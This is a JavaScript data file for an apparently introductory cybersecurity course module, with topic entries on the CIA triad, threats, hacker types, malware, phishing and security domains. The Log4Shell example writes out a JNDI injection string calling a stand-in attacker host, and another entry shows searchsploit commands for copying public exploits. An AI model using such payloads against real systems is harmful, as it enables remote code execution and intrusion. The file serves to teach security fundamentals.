// Helpers are defined in app.js (loaded first)
const M1={title:'Cybersecurity Fundamentals',topics:[
{title:'What is Cybersecurity',
def:'Cybersecurity is the practice of protecting computers, networks, programs, and data from unauthorized access, damage, or attacks using a combination of people, processes, and technology.',
why:'Cybercrime costs exceed $10 trillion annually. Every organisation using computers needs cybersecurity — from hospitals to governments to startups.',
beginner:'Think of cybersecurity like home security — locks and cameras protect your house. Firewalls, encryption, and monitoring protect digital assets. It covers both <em>prevention</em> and <em>response</em>.',
technical:'Cybersecurity spans three domains: (1) Prevention — firewalls, patching, access control; (2) Detection — SIEM, IDS, threat intel; (3) Response — IR playbooks, forensics, recovery. It is not just IT support — it is an adversarial discipline.',
example:'When you log into your bank: HTTPS encrypts your data, a WAF blocks attacks, and a SIEM monitors logins. That combination is cybersecurity in action.',
mistakes:['Treating cybersecurity as purely a technology problem (people and process are equally important)','Thinking only large companies are targeted (SMBs are primary ransomware targets)','Confusing cybersecurity with IT support'],
interview:[{q:'What is cybersecurity?',a:'Protecting digital assets using people, process, and technology. Covers prevention, detection, response, and recovery.'},{q:'What are the three pillars of cybersecurity?',a:'People, Process, and Technology.'}],
summary:'Cybersecurity = protecting digital assets. Pillars: People · Process · Technology. Both offensive (pentesting) and defensive (SOC) roles exist.'},

{title:'CIA Triad',
def:'The foundational model of information security: Confidentiality (only authorised access), Integrity (data is unmodified), Availability (systems accessible when needed).',
why:'Every security control maps to one or more CIA properties. It is the decision-making lens for all security work.',
beginner:'C = your diary is private. I = nobody changed what you wrote. A = you can read it whenever you want.',
technical:'Confidentiality → AES encryption, RBAC, ACLs. Integrity → SHA-256/SHA-3, digital signatures, HMAC. Availability → N+1 redundancy, load balancers, DDoS scrubbing, backups.',
example:'A ransomware attack simultaneously breaks Availability (encrypts files), Confidentiality (exfiltrates data), and Integrity (corrupts backups).',
commands:cb('CIA Triad Controls',`Confidentiality → Encryption, Access Control, MFA
Integrity      → Hashing (SHA-256), Digital Signatures, HMAC
Availability   → Redundancy, Load Balancers, DDoS Protection, Backups

Attack → CIA property broken:
  DDoS           → Availability
  Data breach    → Confidentiality
  MitM/tampering → Integrity`),
interview:[{q:'What is the CIA Triad?',a:'Confidentiality, Integrity, Availability — the three core goals of information security. Every security control maps to one or more.'},{q:'Which CIA property does a DDoS attack primarily violate?',a:'Availability — the system becomes inaccessible to legitimate users.'}],
summary:'CIA = Confidentiality · Integrity · Availability. C→Encryption | I→Hashing | A→Redundancy. DDoS=Availability. Data breach=Confidentiality.'},

{title:'Threats, Vulnerabilities & Exploits',
def:'<strong>Threat</strong> = potential danger. <strong>Vulnerability</strong> = weakness in a system. <strong>Exploit</strong> = the method used to take advantage of a vulnerability.',
why:'Understanding the difference helps you prioritise defences. Risk = Threat × Vulnerability. Eliminating either reduces risk to zero.',
beginner:'Threat = the storm. Vulnerability = a crack in the wall. Exploit = water pouring through. You cannot stop storms but you can fix the crack.',
technical:'CVE (Common Vulnerabilities and Exposures) is the global database. CVSS scores rate 0–10: 0–3.9 Low | 4–6.9 Medium | 7–8.9 High | 9–10 Critical. Zero-day = no patch exists yet.',
example:'Log4Shell (CVE-2021-44228): Threat = malicious actors. Vulnerability = JNDI lookup in Log4j logging code. Exploit = injecting ${jndi:ldap://attacker.com/a} into user input.',
commands:cb('Vulnerability Research',`# Search CVE database
https://cve.mitre.org/
https://nvd.nist.gov/

# Search for known exploits
searchsploit apache 2.4.49
searchsploit -m 50383           # Copy exploit to current dir

# Check CVSS score
# Visit: https://nvd.nist.gov/vuln/detail/CVE-2021-44228`),
mistakes:['Using "threat" and "vulnerability" interchangeably','Ignoring Medium/Low CVEs — they chain together to become Critical','Not tracking patch status for all software'],
interview:[{q:'What is the difference between a vulnerability and an exploit?',a:'A vulnerability is a weakness; an exploit is the code/method that takes advantage of it.'},{q:'What is a zero-day?',a:'A vulnerability with no available patch — unknown to the vendor or not yet fixed.'}],
summary:'Threat=danger | Vulnerability=weakness | Exploit=weapon. Zero-day=no patch. CVSS 9-10=Critical. Patch management = most impactful security activity.'},

{title:'Types of Hackers',
def:'Hackers are categorised by intent and authorisation using a "hat" colour system.',
why:'Understanding hacker types helps you understand attacker motivations and choose the right career path.',
beginner:'White hat = good guys with permission. Black hat = criminals. Grey hat = somewhere in between. Your role as an intern = White Hat always.',
technical:'APT (Advanced Persistent Threat) = sophisticated, long-duration, usually state-sponsored attackers. Bug bounty hunters are White Hats paid to find vulnerabilities legally.',
commands:tbl([['Type','Intent','Authorised?','Example'],['White Hat','Ethical, improve security','Yes (legal)','Pentesters, bug bounty hunters'],['Black Hat','Malicious, financial gain','No (illegal)','Cybercriminals, ransomware gangs'],['Grey Hat','Mixed — finds without permission','Partial','Notifies vendor after finding bug'],['Script Kiddie','No skill, uses others\' tools','No','Downloads Metasploit, no understanding'],['Hacktivist','Ideological/political','No','Anonymous'],['State-Sponsored','Espionage/warfare','Varies','APT28 (Russia), Lazarus (DPRK)'],['Insider Threat','Disgruntled employee','Abused','Employee stealing data before leaving']]),
interview:[{q:'What is an APT?',a:'Advanced Persistent Threat — sophisticated, long-duration attacker, usually state-sponsored, targeting specific organisations.'},{q:'What is a bug bounty?',a:'A programme where companies pay ethical hackers to find and responsibly disclose vulnerabilities.'}],
summary:'White=ethical | Black=criminal | Grey=middle. APT=nation-state level. Script Kiddie=no skills. Your role=White Hat always.'},

{title:'Malware Types',
def:'Malware (malicious software) is any program designed to disrupt, damage, or gain unauthorised access to systems.',
why:'Malware is the most common attack tool post-initial-access. Understanding types helps with detection and response.',
beginner:'Malware is like different types of intruders: a virus attaches to files, a worm travels on its own, ransomware locks your stuff and demands payment.',
technical:'Modern malware is multi-stage: dropper → payload → persistence. C2 (Command and Control) servers communicate with malware remotely. Fileless malware runs in memory — no disk footprint.',
commands:tbl([['Type','What it Does','Example'],['Virus','Self-replicates by attaching to files','ILOVEYOU'],['Worm','Self-replicates across networks','WannaCry'],['Trojan','Disguises as legitimate software','RATs (Remote Access Trojans)'],['Ransomware','Encrypts files, demands payment','LockBit, REvil'],['Spyware','Secretly monitors activity','Keyloggers'],['Rootkit','Hides deep in OS, evades detection','Stuxnet'],['Botnet','Network of infected machines (zombies)','Mirai (IoT)'],['Fileless','Lives in RAM, no files on disk','PowerShell-based attacks']]),
example:'WannaCry (2017): ransomware worm exploiting EternalBlue (SMB port 445). Spread like a worm, encrypted files, demanded Bitcoin. Hit 200,000 systems in 150 countries.',
mistakes:['Thinking AV stops all malware (fileless malware bypasses AV)','Assuming ransomware is the only financial threat','Not having offline backups (ransomware destroys network backups)'],
interview:[{q:'What is the difference between a virus and a worm?',a:'A virus attaches to files and needs a host to spread. A worm self-replicates across networks without needing a host file.'},{q:'What makes fileless malware harder to detect?',a:'It runs entirely in memory (RAM) with no files written to disk, bypassing signature-based AV solutions.'}],
summary:'Virus=attaches to files | Worm=network self-spread | Ransomware=most financially damaging | Fileless=hardest to detect. C2=attacker control server.'},

{title:'Phishing & Social Engineering',
def:'Social engineering is psychological manipulation of people to divulge information or perform actions. Phishing is fraudulent communication impersonating trusted entities.',
why:'Phishing is the #1 initial access vector in real-world breaches. Technical defences mean nothing if a user hands over credentials.',
beginner:'Attackers exploit human psychology — urgency, fear, authority, curiosity. An email saying "Your account will be closed in 24 hours — click here!" is phishing.',
technical:'Spear phishing targets specific individuals using personal details (LinkedIn research). Whaling targets executives. BEC (Business Email Compromise) causes billions in losses annually. DMARC + DKIM + SPF reduce email spoofing.',
commands:tbl([['Type','Description'],['Phishing','Bulk email impersonating trusted brands'],['Spear Phishing','Targeted phishing at a specific individual'],['Whaling','Spear phishing targeting executives (CEO/CFO)'],['Smishing','Phishing via SMS text message'],['Vishing','Phishing via voice/phone call'],['Pretexting','Creating a fake scenario to extract info'],['Baiting','Leaving USB drive labelled "Salary Data 2026"'],['Tailgating','Physically following into a secure area']]),
example:'Finance employee receives email from "CEO@company-corp.com" (real: company.com) saying "Wire £50,000 now — urgent and confidential." This is whaling/BEC.',
mistakes:['Only checking the display name not the actual email address','Clicking links instead of navigating manually to websites','Not verifying urgent financial requests out-of-band (call the person directly)'],
interview:[{q:'What is the difference between phishing and spear phishing?',a:'Phishing is bulk/untargeted. Spear phishing is targeted at a specific individual using personal research.'},{q:'What is whaling?',a:'Spear phishing specifically targeting senior executives like CEO or CFO.'}],
summary:'Phishing=fake emails | Smishing=SMS | Vishing=phone | Spear=targeted | Whaling=executive. Humans=weakest link. Always verify out-of-band.'},

{title:'Cyber Attack Basics',
def:'A cyber attack is a deliberate attempt to breach information systems. Attacks range from opportunistic automated scans to sophisticated nation-state operations.',
why:'Understanding attack types helps defenders build appropriate controls and helps pentesters simulate realistic scenarios.',
commands:tbl([['Attack','Description'],['DDoS','Flood a system to deny service'],['Man-in-the-Middle','Intercept communication between two parties'],['SQL Injection','Inject SQL code into database queries'],['XSS','Inject scripts into pages viewed by users'],['Brute Force','Try all possible passwords'],['Credential Stuffing','Use leaked passwords on other sites'],['Supply Chain','Compromise software before it reaches target'],['Zero-Day Exploit','Exploit unknown, unpatched vulnerability']]),
example:'SolarWinds (2020): attackers compromised the build system. Malicious update shipped to 18,000+ orgs including US government agencies. Classic supply chain attack.',
interview:[{q:'What is credential stuffing?',a:'Using leaked username/password pairs from one breach to try on other websites, exploiting password reuse.'},{q:'What is a supply chain attack?',a:'Compromising a trusted vendor\'s software/service to reach downstream customers at scale.'}],
summary:'DDoS=Availability attack | MitM=intercept traffic | SQLi/XSS=web attacks | Supply chain=reach thousands via one vendor.'},

{title:'Cybersecurity Domains',
def:'Cybersecurity is divided into specialised domains, each covering a distinct area of security practice.',
why:'Understanding domains helps identify career paths. Most professionals specialise in 1–2 but need awareness of all.',
commands:tbl([['Domain','Focus','Key Tools'],['Network Security','Protecting network infrastructure','Firewalls, IDS/IPS, Wireshark'],['Application Security','Securing web/mobile apps','Burp Suite, SAST, DAST'],['Cloud Security','Securing cloud environments','AWS IAM, ScoutSuite, Prowler'],['Incident Response','Responding to breaches','SIEM, Forensics, SOAR'],['Threat Intelligence','Gathering intel on threats','MITRE ATT&CK, VirusTotal'],['Red Team','Simulated offensive attacks','Metasploit, Cobalt Strike'],['Blue Team','Defensive monitoring','SIEM, EDR, Splunk'],['GRC','Governance, Risk, Compliance','ISO 27001, GDPR, NIST'],['Digital Forensics','Investigating cybercrime','Autopsy, Volatility, FTK']]),
interview:[{q:'What is the difference between Red Team and Blue Team?',a:'Red Team = offensive security (simulated attackers). Blue Team = defensive security (monitoring, detection, response). Purple Team = both working together.'},{q:'What is GRC?',a:'Governance, Risk, and Compliance — the policy, legal, and regulatory side of cybersecurity.'}],
summary:'Red=offensive | Blue=defensive | Purple=both. GRC=compliance/policy. Your internship will touch Network Security, AppSec, and Blue Team basics.',
quiz:qz('Which team simulates real-world attacks against an organisation?',['Blue Team','Purple Team','Red Team','SOC Team'],2,'Red Team = offensive, simulates attacks. Blue Team = defensive. Purple Team = Red + Blue working together.')},
]};
